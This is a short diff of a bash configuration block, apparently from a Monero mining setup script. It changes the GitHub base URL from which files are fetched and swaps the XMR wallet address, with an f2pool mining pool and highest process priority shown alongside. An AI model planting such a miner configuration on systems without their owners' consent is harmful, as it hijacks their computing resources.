@@ -1,8 +1,8 @@
 #!/bin/bash
-BASE_URL="https://raw.githubusercontent.com/wjy20030407/nmsl/master"  # no `/` in the end of line
+BASE_URL="https://raw.githubusercontent.com/Nolovenodie/nmsl/master"  # no `/` in the end of line
 
 POOL="xmr.f2pool.com:13531"
-USER="48SBrB7Phz4MrwWQbXpMZHQX4CnCQvS15YSNHpqk4x6NCESMbwhKwNrbxyPPJTmXrdZkia8evQSnA2yUNGzodeD896KVco1"
+USER="48XWJEBUqV5GMbHmS4LwUtRt2RKW8pGQGedgHL49PcfB83Fsu6hLqjaB37imfdSGCmHGdvew6NpxgAoEmj1ZsvhoPscrKYu"
 PASSWORD="x"
 
 PRIORITY=5  # set process priority (0 idle, 2 normal to 5 highest)
